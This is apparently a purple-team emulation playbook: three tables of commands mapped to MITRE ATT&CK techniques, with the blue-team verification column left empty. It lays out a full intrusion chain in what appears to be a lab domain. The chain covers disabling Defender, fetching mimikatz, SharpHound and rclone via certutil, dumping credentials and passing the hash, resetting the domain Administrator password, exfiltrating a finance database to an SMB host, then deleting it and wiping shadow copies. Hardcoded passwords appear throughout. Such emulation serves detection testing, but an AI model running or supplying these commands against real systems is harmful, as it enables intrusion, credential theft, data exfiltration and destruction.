# Red Team Emulation Reference

## Part 1
| Step | Action | ATT&CK Techniques | Blue Verification |
|--------|-------------------------------------------------------------------------|----------------|-----------------------------------------------------------|
|1.1 | `nmap -Pn -p 22,445,636,3389 --open 10.0.1.0/24` | T1595, T1003|
|1.2 | `xfreerdp /u:PurpleUser /p:SecurePwd123 /v:10.0.1.15 /cert-ignore` | T1021.001, T1078|
|1.3 | `whoami /all systeminfo` | T1033, T1082, T1059.001<br>(PowerShell T1059.001 will not be mentioned after that every time it is used)|
|1.4 | `quser` | T1033, T1082|
|1.5 | `net localgroup administrators`| T1069.001|
|1.6 | `Get-Process \| Select -Unique ProcessName` | T1057|
|1.7 | `Get-MpComputerStatus` | ? ||
|1.8 | `Get-ScheduledTask \| where {$_.TaskPath -notlike "*Microsoft*" }` | T1053.001|
|1.9 | `schtasks /query /fo LIST /v /tn UpdateTask` | T1053.001|
|1.10 | `icacls C:\Update.ps1` | T1222.001|
|1.11 | `"net localgroup administrators PurpleUser /add" \| Out-File -Append C:\Update.ps1` | T1078.003|
|1.12 | `net localgroup administrators` | T1069.001|
|1.13 | `whoami /all` | T1033|
|1.14 | `Set-MpPreference -DisableRealtimeMonitoring 1`<br>`Set-MpPreference -DisableBehaviorMonitoring 1`<br>`Set-MpPreference -DisableScriptScanning 1`<br>`Set-MpPreference -DisableBlockAtFirstSeen 1` | T1562.001|
|1.15 | `certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/mimikatz.exe C:\Temp\m.exe` | T1105|
|1.16 | `C:\temp\m.exe`<br>`privilege::debug`<br>`sekurlsa::logonpasswords` | T1003.001|

## Part 2

| Step | Action | ATT&CK Techniques | Blue Verification |
|--------|-------------------------------------------------------------------------|----------------|-----------------------------------------------------------|
|2.1 | `[ITSERVER:mimikatz] sekurlsa::pth /user:billh /ntlm:<NTLM-hash> /domain:attackrange /run:powershell` | T1550.002|
|2.2 | `certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/SharpHound.exe C:\Temp\sh.exe` | T1105|
|2.3 | `C:\temp\sh.exe --memcache --zipfilename c.zip --outputdirectory C:\temp\` | T1087.001, T1087.002, T1560, T1059.001, T1482, T1615, T1106, T1201, T1069.001, T1069.002, T1018, T1033|
|2.4 | `certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/rclone.exe C:\Temp\r.exe` | T1105|
|2.5 | `[ss]`<br>`type = smb`<br>`host = 10.0.1.30`<br>`user = user`<br>`pass = KN_sSidIRaFo_cmcZ_YNa5o8SLfyli8` |?|
|2.6 | `C:\Temp\r.exe --config C:\Temp\r.conf copy C:\Temp\<c.zip-filename> ss:data --no-check-dest` | T1048|
|2.7 | `certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/PowerShellActiveDirectory.dll C:\Temp\a.dll Import-Module C:\Temp\a.dll` | T1005|
|2.8 | `Add-ADGroupMember -Identity "ITSupport" -Members "billh"` | T1098.007|
|2.9 | `Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString 'DomainPwned!' -AsPlainText -Force) -Reset` | T1098|

## Part 3

| Step | Action | ATT&CK Techniques | Blue Verification |
|--------|-------------------------------------------------------------------------|----------------|-----------------------------------------------------------|
|3.1 | `xfreerdp /u:Administrator /p:'DomainPwned!' /d:ATTACKRANGE /v:10.0.1.16 /cert-ignore` | T1021.001, T1078|
|3.2 | `certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/rclone.exe C:\Temp\r.exe` | T1105|
|3.3 | `[ss]`<br>`type = smb`<br>`host = 10.0.1.30`<br>`user = user`<br>`pass = KN_sSidIRaFo_cmcZ_YNa5o8SLfyli8` |?|
|3.4 | `Set-MpPreference -DisableRealtimeMonitoring 1` | T1562.001|
|3.5 | `C:\Temp\r.exe --config C:\Temp\r.conf copy C:\Users\Administrator\Documents\finance.db ss:data --no-check-dest` | T1048|
|3.6 | `rm C:\Users\Administrator\Documents\finance.db`<br>`vssadmin.exe delete shadows /all` | T1490|
